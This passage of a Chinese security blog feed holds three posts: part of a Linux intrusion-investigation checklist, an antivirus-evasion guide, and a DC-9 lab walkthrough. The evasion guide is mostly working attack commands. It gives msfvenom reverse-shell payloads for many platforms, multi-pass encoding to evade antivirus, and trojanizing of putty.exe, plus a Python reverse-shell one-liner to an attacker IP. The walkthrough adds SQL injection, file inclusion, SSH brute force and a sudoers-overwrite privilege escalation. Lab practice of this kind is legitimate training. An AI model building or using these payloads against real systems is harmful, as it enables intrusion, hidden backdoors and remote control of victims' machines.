$(cut -f1 -d: /etc/passwd); <span class="keyword">do</span> <span class="built_in">echo</span> $user; crontab -u $user -l; done //查看所有用户的计划任务 </span><br><span class="line">cat /etc/crontab //查看系统任务表</span><br><span class="line">cat /etc/cron.d/*</span><br><span class="line">cat /etc/cron.daily/*</span><br><span class="line">cat /etc/cron.weekly/*</span><br><span class="line">cat /etc/cron.monthly/*</span><br></pre></td></tr></table></figure><h3 id="自启动项-1"><a href="#自启动项-1" class="headerlink" title="自启动项"></a>自启动项</h3><p>重点目录：<br>&#x2F;etc&#x2F;profile.d<br>&#x2F;etc&#x2F;init.d<br>&#x2F;etc&#x2F;rc.d&#x2F;init.d<br>&#x2F;etc&#x2F;rc*.d<br>重点文件：<br>&#x2F;etc&#x2F;pfofile<br>&#x2F;etc&#x2F;bashrc<br>~&#x2F;.bash_profile<br>~&#x2F;.profile<br>~&#x2F;.bash_login<br>~&#x2F;.bash_logout</p><h3 id="日志-1"><a href="#日志-1" class="headerlink" title="日志"></a>日志</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stat filename;</span><br><span class="line">ls -lu;ls -l;ls -lc;</span><br></pre></td></tr></table></figure><p>Access Time 访问时间-读取文件内容（cat&#x2F;more）<br>Modify Time 修改时间-修改文件内容（vim&#x2F;&gt;&#x2F;&gt;&gt;&#x2F;ls -l）默认只有root能修改日志<br>Change Time 状态时间-修改文件内容&#x2F;属性(chmod&#x2F;chown)</p><h4 id="登录日志"><a href="#登录日志" class="headerlink" title="登录日志"></a>登录日志</h4><p>重点排查文件<br>&#x2F;var&#x2F;log&#x2F;secure &#x2F;&#x2F;记录用户验证、授权等信息</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Accepted&quot; /var/log/secure //登录成功</span><br><span class="line">grep &quot;Failed&quot; /var/log/secure //登录失败</span><br><span class="line">grep &quot;useradd&quot; /var/log/secure //添加用户</span><br><span class="line">grep &quot;userdel&quot; /var/log/secure //删除用户</span><br></pre></td></tr></table></figure><p>&#x2F;var&#x2F;log&#x2F;lastlog &#x2F;&#x2F;记录最近成功登录的事件<br>&#x2F;var&#x2F;log&#x2F;btmp &#x2F;&#x2F;记录所有登录失败的记录<br>&#x2F;var&#x2F;log&#x2F;wtmp &#x2F;&#x2F;记录每个用户登录、注销及系统的启动、停机的事件<br>&#x2F;var&#x2F;run&#x2F;utmp &#x2F;&#x2F;记录每个用户的信息</p><h4 id="操作日志"><a href="#操作日志" class="headerlink" title="操作日志"></a>操作日志</h4><p>~&#x2F;.bash_history &#x2F;&#x2F;bash历史记录<br>~&#x2F;.viminfo &#x2F;&#x2F;vim操作历史记录<br>~&#x2F;.ssh&#x2F;known_hosts &#x2F;&#x2F;ssh连接记录记录</p><h4 id="web日志-x2F-应用日志"><a href="#web日志-x2F-应用日志" class="headerlink" title="web日志&#x2F;应用日志"></a>web日志&#x2F;应用日志</h4><p>&#x2F;var&#x2F;log&#x2F;nginx<br>&#x2F;var&#x2F;log&#x2F;httpd<br>&#x2F;user-projects&#x2F;<domain_name>&#x2F;servers&#x2F;<server_name>&#x2F;logs&#x2F;access.log</server_name></domain_name></p><h3 id="webshell排查-1"><a href="#webshell排查-1" class="headerlink" title="webshell排查"></a>webshell排查</h3><p>工具：<a href="https://www.shellpub.com/">河马</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入侵检测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免杀-工具篇</title>
      <link href="/2022/05/11/%E5%85%8D%E6%9D%80-%E5%B7%A5%E5%85%B7%E7%AF%87/"/>
      <url>/2022/05/11/%E5%85%8D%E6%9D%80-%E5%B7%A5%E5%85%B7%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><h3 id="常见参数"><a href="#常见参数" class="headerlink" title="常见参数"></a>常见参数</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p,-payload&lt;payload&gt;指定需要使用的payload</span><br><span class="line">-l,-list[module_type]列出指定模块的所有可用资源，模块类型包括：payloads，encoders, nops, all</span><br><span class="line">-n,-nopsled&lt;length&gt;为payload预先指定一个NOP滑动长度</span><br><span class="line">-f,-format&lt;format&gt;指定输出格式</span><br><span class="line">-e,-encoder[encoder]指定需要使用的encoder(编码器)</span><br><span class="line">-a,-arch&lt;architecture&gt;指定payload的目标架构,例如x86|x64|x86_64</span><br><span class="line">-platform&lt;platform&gt;指定payload的目标平台</span><br><span class="line">-s,-space&lt;length&gt;设定有效攻击载荷的最大长度,文件大小</span><br><span class="line">-b,-bad-chars&lt;list&gt;设定规避字符集，指定需要过滤的坏字符(&#x27;\x0f&#x27;、&#x27;\x00&#x27;)</span><br><span class="line">-i,-iterations&lt;count&gt;指定payload的编码次数</span><br><span class="line">-c,-add-code&lt;path&gt;指定一个附加的win32 shellcode文件</span><br><span class="line">-x, –template &lt; path&gt; 指定一个自定义的可执行文件作为模板,并将payload嵌入其中,就是捆绑的意思</span><br><span class="line">-k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">–payload-options 列举payload的标准选项</span><br><span class="line">-o, –out &lt; path&gt; 指定创建好的payload的存放位置</span><br><span class="line">-v, –var-name &lt; name&gt; 指定一个自定义的变量，以确定输出格式</span><br><span class="line">–shellest 最小化生成payload</span><br><span class="line">-h, –help 查看帮助选项</span><br><span class="line">–help-formats 查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure><h3 id="监听参数"><a href="#监听参数" class="headerlink" title="监听参数"></a>监听参数</h3><h4 id="防止假死与假session"><a href="#防止假死与假session" class="headerlink" title="防止假死与假session"></a>防止假死与假session</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> ExitOnSession <span class="literal">false</span>   //可以在接收到seesion后继续监听端口，保持侦听。</span><br></pre></td></tr></table></figure><h4 id="防止session意外退出"><a href="#防止session意外退出" class="headerlink" title="防止session意外退出"></a>防止session意外退出</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> SessionCommunicationTimeout 0  //默认情况下，如果一个会话将在5分钟（300秒）没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> SessionExpirationTimeout 0 //默认情况下，一个星期（604800秒）后，会话将被强制关闭,修改为0可永久不会被关闭</span><br></pre></td></tr></table></figure><h4 id="handler后台持续监听"><a href="#handler后台持续监听" class="headerlink" title="handler后台持续监听"></a>handler后台持续监听</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; exploit -j -z</span><br></pre></td></tr></table></figure><h4 id="payload的可持续化"><a href="#payload的可持续化" class="headerlink" title="payload的可持续化"></a>payload的可持续化</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e x86/shikata_ga_nai -b <span class="string">&quot;\x00&quot;</span> -i 5 -a x86 --platform win PrependMigrate=<span class="literal">true</span> PrependMigrateProc=svchost.exe -f exe -o  shell.exe</span><br></pre></td></tr></table></figure><p>PrependMigrate&#x3D;true PrependMigrateProc&#x3D;svchost.exe 使这个程序默认会迁移到svchost.exe进程</p><h4 id="绕过杀软"><a href="#绕过杀软" class="headerlink" title="绕过杀软"></a>绕过杀软</h4><p>使用reverse_https等payload时可以使用下列方法bypass部分杀软</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> EnableStageEncoding <span class="literal">true</span>   //尝试使用不同的编码器对stage进行编码，可能绕过部分杀软的查杀</span><br><span class="line">EnableStageEncoding =&gt; <span class="literal">true</span></span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> stageencoder x86/fnstenv_mov</span><br><span class="line">Stageencoder =&gt; x64/xor</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> stageencodingfallback <span class="literal">false</span></span><br><span class="line">stageencodingfallback =&gt; <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>使用reverse_tcp_rc4也有同样的效果，而且不能设置stageencoder选项，更稳定更方便</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp_rc4  lhost=10.211.55.2 lport=3333 RC4PASSWORD=tidesec  -f c</span><br></pre></td></tr></table></figure><h3 id="各平台payload生成"><a href="#各平台payload生成" class="headerlink" title="各平台payload生成"></a>各平台payload生成</h3><h4 id="window"><a href="#window" class="headerlink" title="window"></a>window</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Windows -f exe &gt; shell.exe</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Linux -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><h4 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform osx -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure><h4 id="android"><a href="#android" class="headerlink" title="android"></a>android</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.apk</span><br><span class="line"></span><br><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 R &gt; test.apk</span><br></pre></td></tr></table></figure><h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e cmd/powershell_base64 -i 3 -f raw -o shell.ps1</span><br></pre></td></tr></table></figure><h4 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h4><p>正向连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_hidden_bind_tcp LHOST=10.211.55.2 LPORT=3333  -f exe&gt; 1.exe</span><br></pre></td></tr></table></figure><p>反向连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333  -f exe&gt; 1.exe</span><br></pre></td></tr></table></figure><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><h4 id="lunix"><a href="#lunix" class="headerlink" title="lunix"></a>lunix</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Windows -f c</span><br></pre></td></tr></table></figure><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Linux -f c</span><br></pre></td></tr></table></figure><h4 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform osx -f c</span><br></pre></td></tr></table></figure><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><h4 id="Python反弹shell"><a href="#Python反弹shell" class="headerlink" title="Python反弹shell"></a>Python反弹shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.py</span><br><span class="line"></span><br><span class="line">msfvenom -a python -p python/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.py</span><br></pre></td></tr></table></figure><h4 id="Python正向shell"><a href="#Python正向shell" class="headerlink" title="Python正向shell"></a>Python正向shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">python/python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.211.55.2&quot;,3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br><span class="line"></span><br><span class="line">python/python3 -c <span class="string">&quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&quot;</span>10.211.55.2<span class="string">&quot;,3333))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span></span><br></pre></td></tr></table></figure><h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure><h4 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure><h4 id="lua"><a href="#lua" class="headerlink" title="lua"></a>lua</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_lua LHOST=10.211.55.2 LPORT=3333 -f raw -o shell.lua</span><br></pre></td></tr></table></figure><h4 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p ruby/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw -o shell.rb</span><br></pre></td></tr></table></figure><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.php</span><br></pre></td></tr></table></figure><h4 id="aspx"><a href="#aspx" class="headerlink" title="aspx"></a>aspx</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f aspx -o shell.aspx</span><br></pre></td></tr></table></figure><h4 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure><h4 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure><h4 id="war"><a href="#war" class="headerlink" title="war"></a>war</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f war &gt; shell.war</span><br></pre></td></tr></table></figure><h4 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p nodejs/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw -o shell.js</span><br></pre></td></tr></table></figure><h3 id="Handlers"><a href="#Handlers" class="headerlink" title="Handlers"></a>Handlers</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD &lt;Payload name&gt;</span><br><span class="line"><span class="built_in">set</span> LHOST 10.211.55.2</span><br><span class="line"><span class="built_in">set</span> LPORT 3333</span><br><span class="line"><span class="built_in">set</span> ExitOnSession <span class="literal">false</span></span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure><h3 id="自编码处理"><a href="#自编码处理" class="headerlink" title="自编码处理"></a>自编码处理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --list encoders //所有编码方式</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e x86/shikata_ga_nai -b <span class="string">&quot;\x00&quot;</span> -i 15 -f</span><br><span class="line">exe -o payload2.exe //使用x86/shikata_ga_nai对payload进行编码</span><br></pre></td></tr></table></figure><h3 id="自捆绑免杀"><a href="#自捆绑免杀" class="headerlink" title="自捆绑免杀"></a>自捆绑免杀</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -x putty.exe -f exe -o payload3.exe //将payload与putty.exe捆绑在一起</span><br></pre></td></tr></table></figure><h3 id="自捆绑-编码"><a href="#自捆绑-编码" class="headerlink" title="自捆绑+编码"></a>自捆绑+编码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e x86/shikata_ga_nai -x putty.exe -i 15 -</span><br><span class="line">f exe -o payload4.exe</span><br></pre></td></tr></table></figure><h3 id="多重编码"><a href="#多重编码" class="headerlink" title="多重编码"></a>多重编码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 LHOST=10.211.55.2 LPORT=3333 -f raw |</span><br><span class="line">msfvenom -e x86/alpha_upper -i 10 -f raw | msfvenom -e x86/countdown -i 10 -x putty.exe -f exe -o payload5.exe</span><br></pre></td></tr></table></figure><p>shikata_ga_nai编码20次，alpha_upper编码10次，countdown编码10次</p><h2 id="msf-evasion"><a href="#msf-evasion" class="headerlink" title="msf evasion"></a>msf evasion</h2><h3 id="生成exe"><a href="#生成exe" class="headerlink" title="生成exe"></a>生成exe</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">show evasion(查看evasion的模块)</span><br><span class="line">use windows/windows_defender_exe</span><br><span class="line"><span class="built_in">set</span> filename payload.exe</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST</span><br><span class="line"><span class="built_in">set</span> LPORT</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="Shellter"><a href="#Shellter" class="headerlink" title="Shellter"></a>Shellter</h2><p>kali</p><p>shellter &#x2F;&#x2F;进入shellter</p><p><img src="/2022/05/11/%E5%85%8D%E6%9D%80-%E5%B7%A5%E5%85%B7%E7%AF%87/1.png" alt="img"></p><p>选择模式Auto<br>输入我们要捆绑的软件</p><p><img src="/2022/05/11/%E5%85%8D%E6%9D%80-%E5%B7%A5%E5%85%B7%E7%AF%87/2.png" alt="img"></p><p>隐匿模式会影响免杀效果<br>payload选择windows&#x2F;reverse_tcp</p><p><img src="/2022/05/11/%E5%85%8D%E6%9D%80-%E5%B7%A5%E5%85%B7%E7%AF%87/3.jpg" alt="img"></p><h2 id="BackDoor-Factory"><a href="#BackDoor-Factory" class="headerlink" title="BackDoor-Factory"></a>BackDoor-Factory</h2><p>检测exe是否符合条件:</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backdoor-factory -f exe路径 -S</span><br></pre></td></tr></table></figure><p>加载自定义shellcode<br>shellcode为raw格式</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">backdoor-factory -f exe路径 -s</span><br><span class="line">user_supplied_shellcode_threaded -U shellcode路径 -o</span><br><span class="line">payload.exe</span><br></pre></td></tr></table></figure><p>参考来源:<a href="https://github.com/TideSec/BypassAntiVirus">https://github.com/TideSec/BypassAntiVirus</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-9</title>
      <link href="/2022/04/30/DC-9/"/>
      <url>/2022/04/30/DC-9/</url>
      
        <content type="html"><![CDATA[<p>渗透环境DC-9：<a href="https://www.vulnhub.com/entry/dc-9,412/">https://www.vulnhub.com/entry/dc-9,412/</a><br>攻击机：192.168.168.128<br>靶机：192.168.168.137</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br><span class="line">nmap -sS -p- 192.168.168.137</span><br></pre></td></tr></table></figure><p><img src="/2022/04/30/DC-9/1.png" alt="img"></p><p>开放的是80端口，访问</p><p><img src="/2022/04/30/DC-9/2.png" alt="img"></p><h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>发现有一个search框，可能存在sql注入，抓包扔到sqlmap试试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r post.txt</span><br></pre></td></tr></table></figure><p><img src="/2022/04/30/DC-9/3.png" alt="img"></p><p>确认存在sql注入<br>后面就是常规的查看数据库了, 因为不是dba所以不能用sqlmap getshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r post.txt --dbs</span><br></pre></td></tr></table></figure><p><img src="/2022/04/30/DC-9/4.png" alt="img"></p><p>有Staff与users这两个相关的数据库<br>看看这两个数据库有什么东西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r post.txt -D Staff --dump </span><br></pre></td></tr></table></figure><p><img src="/2022/04/30/DC-9/5.png" alt="img"></p><p>下面的admin应该是后台的登录账号<br>这里的加密可以用sql自带的加密进行破解，也可以到md5解密网页破解<br>账号：admin<br>密码：transorbital1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r post.txt -D <span class="built_in">users</span> --dump </span><br></pre></td></tr></table></figure><p><img src="/2022/04/30/DC-9/6.png" alt="img"></p><p>又是一些账号密码先记录下来吧</p><p>登录admin看看先</p><p><img src="/2022/04/30/DC-9/7.png" alt="img"></p><p>有这样的字眼，可能有文件包含，试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.168.137/welcome.php?file=../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/2022/04/30/DC-9/8.png" alt="img"></p><p>确实有，然后我就不会做了，尴尬！！！<br>看看其他师傅的做法<br>有这么的一个文件与ssh端口有关knockd.conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://192.168.168.137/welcome.php?file=../../../../../etc/knockd.conf</span><br></pre></td></tr></table></figure><p><img src="/2022/04/30/DC-9/9.png" alt="img"></p><p>我们用nmap对这3个端口进行访问就能开ssh的锁了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p 7469 192.168.168.137</span><br><span class="line">nmap -sS -p 8475 192.168.168.137</span><br><span class="line">nmap -sS -p 9842 192.168.168.137</span><br></pre></td></tr></table></figure><p><img src="/2022/04/30/DC-9/10.png" alt="img"></p><p>开锁成功<br>使用hydra进行爆破，字典是users数据库中的账号和密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P password.txt  192.168.168.137 ssh</span><br></pre></td></tr></table></figure><p><img src="/2022/04/30/DC-9/11.png" alt="img"></p><p>有三个账号都上上看看有什么文件啥的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -a //可以看到隐藏的文件</span><br></pre></td></tr></table></figure><p>在janitor用户下发现了一些密码</p><p><img src="/2022/04/30/DC-9/12.png" alt="img"></p><p>接着用hydra继续爆破</p><p><img src="/2022/04/30/DC-9/13.png" alt="img"></p><p>又多了一个用户啊，登录看看<br>login：fredf<br>password：B4-Tru3-001<br>查看可用信息</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><img src="/2022/04/30/DC-9/14.png" alt="img"></p><p>发现&#x2F;opt&#x2F;devstuff&#x2F;dist&#x2F;test&#x2F;test<br>去看看，直接执行没有什么反应，看看源文件</p><p><img src="/2022/04/30/DC-9/15.png" alt="img"></p><p>argv[1]是读取的文件，argv[2]是将argv[1]文件的内容写入的目标<br>ok，这里我们把东西写入&#x2F;etc&#x2F;sudoers</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;fredf ALL=(ALL)NOPASSWD: ALL&quot;</span> &gt; /tmp/sudoers</span><br><span class="line">sudo /opt/devstuff/dist/test/test /tmp/sudoers /etc/sudoers</span><br></pre></td></tr></table></figure><p>这样就ok啦</p><figure class="highlight 